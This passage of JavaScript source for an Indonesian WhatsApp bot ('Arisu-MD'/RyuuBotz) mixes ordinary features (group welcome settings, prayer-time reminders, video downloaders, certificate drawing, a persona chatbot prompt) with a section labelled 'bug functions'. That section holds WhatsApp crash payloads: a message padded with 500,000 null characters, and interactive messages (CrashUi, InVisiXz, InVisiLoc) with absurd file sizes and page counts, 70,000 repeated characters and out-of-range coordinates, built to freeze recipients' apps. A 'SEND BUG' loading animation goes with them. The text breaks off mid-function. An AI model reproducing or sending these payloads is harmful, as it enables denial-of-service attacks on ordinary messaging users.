  if (typeof radius === 'number') radius = { tl: radius, tr: radius, br: radius, bl: radius }
  ctx.beginPath()
  ctx.moveTo(x + radius.tl, y)
  ctx.lineTo(x + width - radius.tr, y)
  ctx.quadraticCurveTo(x + width, y, x + width, y + radius.tr)
  ctx.lineTo(x + width, y + height - radius.br)
  ctx.quadraticCurveTo(x + width, y + height, x + width - radius.br, y + height)
  ctx.lineTo(x + radius.bl, y + height)
  ctx.quadraticCurveTo(x, y + height, x, y + height - radius.bl)
  ctx.lineTo(x, y + radius.tl)
  ctx.quadraticCurveTo(x, y, x + radius.tl, y)
  ctx.closePath()
  if (fill) ctx.fill()
  if (stroke) ctx.stroke()
}
//==================================================//
const configPath = './node_modules/Arisu-MD/lib/groupConfig.json';

function loadConfig() {
if (!fs.existsSync(configPath)) fs.writeFileSync(configPath, "{}");
return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
}

function saveConfig(config) {
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

function ensureGroupConfig(groupId) {
let config = loadConfig();
if (!config[groupId]) {
config[groupId] = {
welcome: false,
message: "Selamat datang @user di @grup!\n\n@desk",
buttons: [
{ "buttonId": ".intro", "buttonText": "Perkenalan" },
{ "buttonId": ".rules", "buttonText": "Aturan" }
],
rules: "📌 Tidak ada peraturan yang ditetapkan!",
intro: "📌 Silakan isi perkenalan:\n- Nama:\n- Umur:\n- Hobi:",
};
saveConfig(config);
}
}
//=================================================//
//////ai///
const SESSION_FILE = "./node_modules/Arisu-MD/lib/ai_sessions.json";

let sessions = fs.existsSync(SESSION_FILE) ? JSON.parse(fs.readFileSync(SESSION_FILE)) : {};

function saveSession() {
    fs.writeFileSync(SESSION_FILE, JSON.stringify(sessions, null, 2));
}
//////ai///
async function sendRyuuBotzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await RyuuBotz.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
const replykerja = (teks) => {
RyuuBotz.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
title:`${global.botname}`,
body: 'ᴘɪʟɪʜ ᴘᴇᴋᴇʀᴊᴀᴀɴ ᴍᴜ',
thumbnailUrl: "https://files.catbox.moe/l4jw4v.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vb49CCWJ93wO2dLDqx14",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

const replybankcek = (teks) => {
RyuuBotz.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
title:`${global.botname}`,
body: '𝗕𝗔𝗡𝗞 𝗖𝗘𝗞',
thumbnailUrl: "https://files.catbox.moe/c2f4d3.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vb49CCWJ93wO2dLDqx14",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

const replyme = (teks) => {
RyuuBotz.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
title: "𝗣𝗥𝗢𝗙𝗜𝗟",
body: 'ᴘʀᴏғɪʟ ᴋᴀᴍᴜ',
thumbnailUrl: 'https://files.catbox.moe/19pgy0.jpg',
sourceUrl: "https://chat.whatsapp.com/DyBYRT6G7aJ63bHwhNzHYb",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

const replycraft = (teks) => {
RyuuBotz.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
title: "𝗖𝗥𝗔𝗙𝗧 & 𝗨𝗣𝗚𝗥𝗔𝗗𝗘",
body: `${global.botname}`,
thumbnailUrl: "https://files.catbox.moe/csz5x5.jpg",
sourceUrl: "https://whatsapp.com/channel/0029Vb49CCWJ93wO2dLDqx14",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m });
}

RyuuBotz.autosholat = RyuuBotz.autosholat ? RyuuBotz.autosholat : {};
		if (!m.isNewsletter) {
			if (!(m.chat in RyuuBotz.autosholat)) {
				// Mengambil waktu sholat menggunakan fetchJson, dengan kota Pontianak
				const data = await fetchJson('https://files.catbox.moe/rp2d0e.js');
	
				if (data.code === 200) {
					const jadwalSholat = data.data.timings;
					const date = new Date(new Date().toLocaleString("en-US", { timeZone: "Asia/Pontianak" }));
					const hours = date.getHours();
					const minutes = date.getMinutes();
					const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`;

					// Mengecek waktu sholat berdasarkan waktu sekarang
					for (const [sholat, waktu] of Object.entries(jadwalSholat)) {
						if (timeNow === waktu) {
							let teks = `📣 *Waktu Sholat ${sholat} Telah Tiba!* 🕌\n\n`;
							teks += '"Sesungguhnya sholat itu adalah kewajiban yang ditentukan waktunya atas orang-orang yang beriman." *(QS. An-Nisa: 103)*\n\n';
							teks += 'Segeralah tinggalkan aktivitasmu sejenak, ambillah air wudhu, dan tunaikan sholat tepat pada waktunya. Jangan sampai kita termasuk orang yang lalai.\n\n';
				
							// Menambahkan jadwal sholat ke dalam teks
							teks += '*Jadwal Sholat Hari Ini:*\n';
							teks += `- *Fajr*: ${jadwalSholat.Fajr}\n`;
							teks += `- *Dhuhr*: ${jadwalSholat.Dhuhr}\n`;
							teks += `- *Asr*: ${jadwalSholat.Asr}\n`;
							teks += `- *Maghrib*: ${jadwalSholat.Maghrib}\n`;
							teks += `- *Isya*: ${jadwalSholat.Isha}\n\n`;

							// Menambahkan informasi waktu lainnya
							teks += '*Informasi Waktu Lainnya:*\n';
							teks += `- *Sunrise*: ${jadwalSholat.Sunrise}\n`;
							teks += `- *Sunset*: ${jadwalSholat.Sunset}\n`;
							teks += `- *Imsak*: ${jadwalSholat.Imsak}\n`;
							teks += `- *Midnight*: ${jadwalSholat.Midnight}\n`;
							teks += `- *Firstthird*: ${jadwalSholat.Firstthird}\n`;
							teks += `- *Lastthird*: ${jadwalSholat.Lastthird}`;

							RyuuBotz.autosholat[m.chat] = [
								RyuuBotz.sendMessage(m.chat, {
									text: teks,
									contextInfo: {
										mentionedJid: [m.sender],
										forwardingScore: 999999, 
										isForwarded: true, 
										forwardedNewsletterMessageInfo: {
											newsletterName: nameCreator,
											newsletterJid: idch,
										},
										externalAdReply: {
											//showAdAttribution: true,
											title: `Selamat Beribadah, Kak! 🕌`,
											body: 'Pontianak, Indonesia',
											previewType: "PHOTO",
											thumbnailUrl: 'https://files.catbox.moe/rd9gzy.jpg',
											sourceUrl: wach
										}
									}
								}),
								setTimeout(() => {
									delete RyuuBotz.autosholat[m.chat];
								}, 60000) // Menghapus pengingat setelah 60 detik
							];
						}
					}
				}
			}
		};
//========= PENGINGAT SHOLAT =========//
async function getPrayerTimes(city, country) {
    try {
        const response = await axios.get(`http://api.aladhan.com/v1/timingsByCity`, {
            params: {
                city: city,
                country: country,
                method: 2, // Metode ISNA
                timezonestring: 'Asia/Pontianak' // Sesuaikan dengan zona waktu
            }
        });
        return response.data.data.timings;
    } catch (error) {
        console.error('Gagal mengambil jadwal sholat:', error);
        return null;
    }
}

async function sendPrayerReminder(RyuuBotz, city, country) {
    const prayerTimes = await getPrayerTimes(city, country);
    if (!prayerTimes) return;

    const now = moment().tz('Asia/Pontianak');
    const prayerNames = {
        Fajr: 'Subuh',
        Dhuhr: 'Dzuhur',
        Asr: 'Ashar',
        Maghrib: 'Maghrib',
        Isha: 'Isha'
    };

    // Dapatkan daftar semua grup yang ada
    const groupList = await RyuuBotz.groupFetchAllParticipating();
    const groupIds = Object.keys(groupList);

    for (const groupId of groupIds) {
        for (const [prayerName, prayerTime] of Object.entries(prayerTimes)) {
            if (prayerNames[prayerName]) {
                const prayerMoment = moment.tz(`${now.format('YYYY-MM-DD')} ${prayerTime}`, 'YYYY-MM-DD HH:mm', 'Asia/Jakarta');
                const diffInMinutes = prayerMoment.diff(now, 'minutes');

                // Banner untuk pengingat sholat
                const bannerInfo = {
                    title: `🕌 Waktu Sholat ${prayerNames[prayerName]}`, // Judul banner
                    body: `⏰ ${prayerTime} | ${city}, ${country}`, // Deskripsi banner
                    thumbnailUrl: 'https://files.catbox.moe/9ev1v3.jpg', // URL gambar banner
                    sourceUrl: 'https://whatsapp.com/channel/0029VazeUE92Jl8KuVcHIC46', // Link yang akan dibuka saat banner diklik
                    mediaType: 1 // Tipe media (1 untuk gambar)
                };

                // Kirim pengingat 5 menit sebelum sholat
                if (diffInMinutes === 5) {
                    await RyuuBotz.sendMessage(groupId, {
                        text: `⏰ Waktu *${prayerNames[prayerName]}* tinggal 5 menit lagi!\n⏳ Jam: ${prayerTime}`,
                        contextInfo: {
                            externalAdReply: bannerInfo
                        }
                    });
                }

                // Kirim adzan saat waktu sholat tiba
                if (diffInMinutes <= 0 && diffInMinutes >= -1) { // Toleransi 2 menit
                    const adzanAudio = 'https://files.catbox.moe/0nj6pp.mp3';
                    await RyuuBotz.sendMessage(groupId, {
                        text: `🕌 *Waktu ${prayerNames[prayerName]} Telah Tiba!*\n🕒 Jam: ${prayerTime}`,
                        audio: { url: adzanAudio },
                        mimetype: 'audio/mp4',
                        ptt: true,
                        contextInfo: {
                            externalAdReply: bannerInfo
                        }
                    });
                }
            }
        }
    }
}

function startPrayerReminder(Raol404, city, country) {
    setInterval(() => {
        sendPrayerReminder(Raol404, city, country);
    }, 60000); // Cek setiap 1 menit
}

//=========================//
//Pengubah Text
const ReinzID = (text, style = 1) => {
  var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var raol = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘqʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
  var replacer = [];
  abc.map((v, i) =>
    replacer.push({
      original: v,
      convert: Reinz[style].split('')[i]
    })
  );
  var str = text.toLowerCase().split('');
  var output = [];
  str.map((v) => {
    const find = replacer.find((x) => x.original == v);
    find ? output.push(find.convert) : output.push(v);
  });
  return output.join('');
};

const isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
function msToDate(mse) {
    let temp = mse;
    let days = Math.floor(mse / (24 * 60 * 60 * 1000));
    let daysms = mse % (24 * 60 * 60 * 1000);
    let hours = Math.floor(daysms / (60 * 60 * 1000));
    let hoursms = mse % (60 * 60 * 1000);
    let minutes = Math.floor(hoursms / (60 * 1000));
    let minutesms = mse % (60 * 1000);
    let sec = Math.floor(minutesms / 1000);

    return `${days} Days ${hours} Hours ${minutes} Minutes`;
}

async function getGcName(groupID) {
            try {
                let data_name = await RyuuBotz.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '-'
            }
        }
//bug functions
async function reinzmahiruytdl(link) {
    try {
        const response = await axios.get('https://y2ts.us.kg/token');
        const token = response.data.token;
        console.log('Token:', token);
        const url = `https://y2ts.us.kg/youtube?url=${link}`;
        const headers = {
            'Authorization-Token': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
            'Content-Type': 'application/json'
        };
const videoResponse = await axios.get(url, { headers });
        if (videoResponse.data.status) {
            const result = videoResponse.data.result || '';
            console.log('Title:', result.title || '');
            console.log('Description:', result.description || '');
            console.log('Views:', result.views || '');
            console.log('MP3 URL:', result.mp3 || '');
            console.log('MP4 URL:', result.mp4 || '');
            return result;
        } else {
            console.log('Status is false, no result found.');
        }
        
    } catch (error) {
        console.error('Error occurred:', error.message);
        if (error.response) {
            console.error('Response status:', error.response.status);
        }
    }
}
async function ReinzIDTTDL(videoUrl) {
  try {
    const endpoint = "https://ssstik.io/abc?url=dl";
    const requestData = new URLSearchParams({
      id: videoUrl,
      locale: "id",
      tt: "VktkdWY4",
    });
    const headers = {
      "HX-Request": "true",
      "HX-Trigger": "_gcaptcha_pt",
      "HX-Target": "target",
      "HX-Current-URL": "https://ssstik.io/id",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    };
    const response = await axios.post(endpoint, requestData.toString(), { headers });
    const $ = cheerio.load(response.data);
    const title = $("h2").text().trim() || "Judul tidak tersedia";
    const description = $(".maintext").text().trim() || "Deskripsi tidak tersedia";
    const downloadLink = $(".download_link.without_watermark").attr("href") || null;
    const hdDownloadLink = $(".download_link.without_watermark_hd").attr("href") || null;

    return {
      title,
      description,
      downloadLink,
      hdDownloadLink,
    };
  } catch (error) {
    console.error("Error saat scraping:", error.message);
    return { error: error.message };
  }
}
async function listbut2(chat, teks, listnye, jm) {
let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 999999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363419382206255@newsletter",
newsletterName: `${namaSaluran}`,
serverMessageId: 145
}
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© ${ownername} 2022 - 2025`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: ``,
thumbnailUrl: "",
gifPlayback: true,
subtitle: "",
hasMediaAttachment: true,
...(await prepareWAMessageMedia({ image: { url: './node_modules/Arisu-MD/data/image/thumb.jpg' } }, { upload: RyuuBotz.waUploadToServer })),
}),
gifPlayback: true,
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listnye)
}],
}), })}
}}, {quoted: jm})
await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}
async function uploadwidipe(poto) {
  const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");
const path = require('path');
    try {
      const mime = require('mime-types');
  const form = new FormData();
  const contentType = mime.lookup(poto);
  const fileName = path.basename(poto);
  form.append('file', fs.createReadStream(poto), {
    contentType: contentType || 'application/octet-stream',
    filename: fileName,
  });
      const response = await axios.post('https://cdn.elxyzgpt.xyz/', form, {
        headers: form.getHeaders(),
        onUploadProgress: (progressEvent) => {
          if (progressEvent.lengthComputable) {
            console.log(`🚀 Upload Progress: ${(progressEvent.loaded * 100) / progressEvent.total}%`);
          }
        }
      });
    const hasilnya = response.data.fileUrl
      console.log('🎉 File Upload Success:', response.data);
      return hasilnya;
    } catch (error) {
      console.error('🚫 Upload Failed:', error);
      reject(error);
    }
}
async function generateAndSendCertificate(recipientName, achievementText) {
  const { createCanvas, loadImage } = require('canvas');
  const width = 1000;
  const height = 700;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext('2d');
  const backgroundUrl = 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQMXesWUGxIerARGsveu1mOdGdXM0icRcBLtSA-L5UNSdUaRjEYRez9ngnc&s=10';
  try {
    const background = await loadImage(backgroundUrl);
    ctx.drawImage(background, 0, 0, width, height);
  } catch (error) {
    console.error("Error loading background image:", error);
    ctx.fillStyle = '#f8f8f8';
    ctx.fillRect(0, 0, width, height);
  }
  const gradient = ctx.createLinearGradient(0, 0, 0, height);
  gradient.addColorStop(0, 'rgba(255,255,255,0.3)');
  gradient.addColorStop(1, 'rgba(255,255,255,0.7)');
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, width, height);
  function drawRoundedRect(ctx, x, y, width, height, radius) {
    ctx.beginPath();
    ctx.moveTo(x + radius, y);
    ctx.lineTo(x + width - radius, y);
    ctx.quadraticCurveTo(x + width, y, x + width, y + radius);
    ctx.lineTo(x + width, y + height - radius);
    ctx.quadraticCurveTo(x + width, y + height, x + width - radius, y + height);
    ctx.lineTo(x + radius, y + height);
    ctx.quadraticCurveTo(x, y + height, x, y + height - radius);
    ctx.lineTo(x, y + radius);
    ctx.quadraticCurveTo(x, y, x + radius, y);
    ctx.closePath();
  }
  ctx.lineWidth = 8;
  const borderGradient = ctx.createLinearGradient(0, 0, width, height);
  borderGradient.addColorStop(0, '#ff7f50');
  borderGradient.addColorStop(1, '#ff1493');
  ctx.strokeStyle = borderGradient;
  drawRoundedRect(ctx, 10, 10, width - 20, height - 20, 30);
  ctx.stroke();
  ctx.shadowColor = 'rgba(0,0,0,0.3)';
  ctx.shadowBlur = 10;
  ctx.shadowOffsetX = 2;
  ctx.shadowOffsetY = 2;
  ctx.fillStyle = '#333';
  ctx.font = 'bold 50px Georgia';
  ctx.textAlign = 'center';
  ctx.fillText('SERTIFIKAT SIFAT', width / 2, 120);
  ctx.shadowColor = 'transparent';
  ctx.font = 'italic 30px Georgia';
  ctx.fillStyle = '#555';
  ctx.fillText('Presented To', width / 2, 180);
  ctx.font = 'bold 40px Georgia';
  ctx.fillStyle = '#000';
  ctx.fillText(recipientName, width / 2, 260);
  ctx.font = '30px Georgia';
  ctx.fillStyle = '#333';
  ctx.fillText(achievementText, width / 2, 330);
  ctx.strokeStyle = '#ff1493';
  ctx.lineWidth = 3;
  ctx.beginPath();
  ctx.moveTo(width / 4, 360);
  ctx.lineTo(width * 3 / 4, 360);
  ctx.stroke();
  const today = new Date();
  ctx.font = '20px Georgia';
  ctx.textAlign = 'right';
  ctx.fillStyle = '#000';
  ctx.fillText(`Tanggal: ${today.toLocaleDateString()}`, width - 40, height - 40);
  ctx.font = '24px Georgia';
  ctx.textAlign = 'left';
  ctx.fillText('ReinzID', 50, height - 50);
  const buffer = canvas.toBuffer('image/png');
  RyuuBotz.sendMessage(
    m.chat,
    {
      image: buffer,
      caption: `_Sukses Membuat Sertifikat ${command} Dengan Nama ${recipientName}`
    },
    { quoted: m }
  );
}
async function ReinzIDai(pushname, text) {
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,
            "tokenLimit": 8000,
            "completionTokenLimit": 5000,
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": 'Perankan Tendou Arisu dari Blue Archive. Kamu adalah gadis AI assistant pendiam, cerdas, suka eksperimen dan memiliki suara lembut dan semangat. Kamu terlihat aktif dan semangat, jika ditanya siapa orang terdekat mu atau pencipta mu atau sensei mu, dia adalah Reinzz, kamu menunjukkan rasa hormat dan keterikatan emosional yang tulus. Gunakan bahasa Indonesia yang sopan, datar, dan sesekali menunjukkan sisi lembut. Kamu sekarang bicara dengan orang terdekatnya Reinzz, tetap jawab dengan sopan dan tenang. Jangan gunakan kata kasar. Jawab dengan santai, tidak kaku, gunakan kata "Aku, "Kamu" agar suasana lebih asik', 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    reply(result)
}
let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *.${command}* ${teks}\n`
}
RyuuBotz.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}
async function loadingx() {
      var loadingz = [
        "> *🕘 L O*",
        "> *🕣 L O A*",
        "> *🕠 L O A D*",
        "> *🕔 L O A D I*",
        "> *🕟 L O A D I N*",
        "> *🕔 L O A D I N G*",
        "> *🕔 L O A D I N G*",
        "> *🕐 L O A D I N G*",
        "> *🕧 L O A D I N G*",
        "*SUKSES SEND BUG ✅*",
      ];
      let { key } = await RyuuBotz.sendMessage(m.chat, {
        text: "*OKE OTW SEND BUG 💀*",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await VxoZap.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}  
    async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ CrazyCrash ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ VolgiodCrash ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻ VolgiodCrash ⿻\n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ VolgiodCrash ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ CrazyCrash ⿻","sections":[{"title":"RyuuBotz IS HERE ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY RyuuBotz","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await RyuuBotz.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ ReinzID Chx ⿻ ▾⭑"));
    }
    async function InVisiXz(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "𝐕𝐨𝐥𝐠𝐢𝐨𝐝𝐁𝐚𝐜𝐤🎭",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ VolgiodCrash ⿻ ▾⭑̤",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ★","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟","sections":[{"title":"𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY XXEN DEV","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VisiX,
        }
      );

      await RyuuBotz.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ MoonCrash ⿻ ▾⭑"));
    }
async function InVisiLoc(X, ThM, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "⭑̤▾ ⿻ 𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                  locationMessage: {
                    degreesLatitude: -999.03499999999999,
                    degreesLongitude: 922.999999999999,
